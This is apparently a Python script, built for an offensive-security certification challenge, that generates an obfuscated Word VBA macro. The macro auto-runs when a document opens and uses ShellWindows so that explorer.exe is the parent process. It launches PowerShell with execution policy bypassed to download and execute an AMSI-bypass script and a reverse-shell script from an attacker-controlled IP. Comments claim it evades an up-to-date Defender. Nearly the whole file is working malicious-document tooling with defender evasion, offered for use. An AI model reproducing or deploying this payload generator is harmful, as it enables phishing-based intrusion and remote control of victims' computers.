# ShellWindows Process create to get explorer.exe as parent process
# nothing fancy, just 3 iterations of xor and then base64 encoded so the bytes can be transported into a static file (your macro) :)
# tested on up-to-date defender, but your amsi bypass and rev shell dropper will need obfusction as well
# built this for OSEP challenge
# more macro techniques here: https://github.com/S3cur3Th1sSh1t/OffensiveVBA
import random
import string
import base64



ipAddr = ("192.168.21.128")
pShell = ("powershell.exe &")
sCode = (f"""-ep bypass -noexit IEX (New-Object Net.WebClient).DownloadString('http://{ipAddr}/1.ps1'); IEX (New-Object Net.WebClient).DownloadString('http://{ipAddr}/rev.ps1')   &""")
key1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k =10)) 
key2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k =10)) 
key3 = ''.join(random.choices(string.ascii_uppercase + string.digits, k =10)) 
strings = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","za","zb","zc","zd","ze","zf","zg"}
for s in strings:
	globals()['%s' %s] = (''.join(random.choices(string.ascii_lowercase, k=10)))

def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def encrypt(s):
	a = xor(s, key1)
	b = xor(a, key2)
	c = xor(b, key3)
	d = bytearray(c, 'utf-8')
	e = (base64.b64encode(d))
	e2 = e.decode("utf-8")
	return e2

    

ps = encrypt(pShell)
args = encrypt(sCode)

vba=f'''
Private Function {g}({zf} As String, {zg} As String) As String
  Dim {a}() As Byte
  Dim {b}() As Byte
  Dim {c} As Long
  Dim {d} As Long
  Dim {e} As Long
  Dim {f} As Long
  
  {a} = StrConv({zf}, vbFromUnicode)
  {b} = StrConv({zg}, vbFromUnicode)
  {c} = UBound({a})
  {d} = UBound({b})
  For {e} = 0 To {c}
    {a}({e}) = {a}({e}) Xor {b}({f})
    If {f} < {d} Then
      {f} = {f} + 1
    Else
      {f} = 0
    End If
  Next {e}
  {g} = StrConv({a}, vbUnicode)
End Function

Function {h}(a, b)
    {h} = a
    If b < a Then {h} = b
End Function
Function {i}({q})
    Dim {j} As String
    Dim {k}() As Byte
    Dim {l} As Object
    Dim {m} As Object
    Dim Offset, Length, {n} As Integer
    
    Set {l} = CreateObject("System.Security.Cryptography.ToBase64Transform")
    Set {m} = CreateObject("System.Text.UTF8Encoding")
    {n} = {l}.InputBlockSize
    For Offset = 0 To LenB({q}) - 1 Step {n}
        Length = {h}({n}, UBound({q}) - Offset)
        {k} = {l}.TransformFinalBlock(({q}), Offset, Length)
        {j} = {j} & {m}.GetString(({k}))
    Next
    {i} = {j}
End Function
Function {o}(b64str)
    Dim {m} As Object
    Dim {p}() As Byte
    Dim {r} As Object
    
    Set {m} = CreateObject("System.Text.UTF8Encoding")
    Set {r} = CreateObject("System.Security.Cryptography.FromBase64Transform")
    {p} = {m}.GetBytes_4(b64str)
    {o} = {r}.TransformFinalBlock(({p}), 0, UBound({p}))
End Function

Public Function {zb}({za})
    Dim {v} As String, {w} As String, data2 As String, {x} As String, {y} As String, {s} As String, {t} As String, {u} As String, {z} As String
    {s} = "{key3}"
    {t} = "{key2}"
    {u} = "{key1}"
    {v} = {o}({za})
    {w} = StrConv({v}, vbUnicode)
    {x} = {g}({w}, {s})
    {y} = {g}({x}, {t})
    {z} = {g}({y}, {u})
    {zb} = {z}
End Function

Sub Document_Open()
 main
End Sub
Sub AutoOpen()
 main
End Sub

Sub main()


    Dim {zd} As String, {zc} As String
    {zd} = "{ps}"
    {zc} = "{args}"
    Debug.Print {zb}({zd})
    Debug.Print {zb}({zc})
    Set ShellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
    Set itemObj = ShellWindows.Item()
    itemObj.Document.Application.ShellExecute {zb}({zd}), {zb}({zc}), "", "open", 0


End Sub
'''
print(vba)
